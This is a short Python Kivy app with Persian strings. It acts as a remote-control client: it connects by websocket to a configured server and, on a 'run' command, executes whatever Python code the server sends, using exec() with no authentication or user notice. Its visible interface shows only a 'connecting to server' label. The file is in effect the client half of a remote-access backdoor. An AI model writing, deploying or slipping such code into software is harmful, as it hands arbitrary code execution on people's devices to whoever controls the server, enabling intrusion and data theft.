from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import websocket
import threading
import json
import client_config
import requests

class RemoteClient(App):
    def build(self):
        Clock.schedule_once(lambda dt: threading.Thread(target=self.connect_to_server).start(), 2)
        return Label(text="در حال اتصال به سرور...")

    def connect_to_server(self):
        def on_message(ws, message):
            try:
                data = json.loads(message)
                if data.get("command") == "show_notification":
                    self.show_notification(data.get("text", "دستور جدید"))
                elif data.get("command") == "run":
                    exec(data.get("code", ""))
            except Exception as e:
                print("خطا در اجرای دستور:", e)

        ws = websocket.WebSocketApp(
            client_config.SERVER_URL,
            on_message=on_message
        )
        ws.run_forever()

    def show_notification(self, text):
        # اینجا می‌تونی از plyer برای نوتیفیکیشن استفاده کنی
        print("نوتیفیکیشن:", text)

if __name__ == "__main__":
    RemoteClient().run()
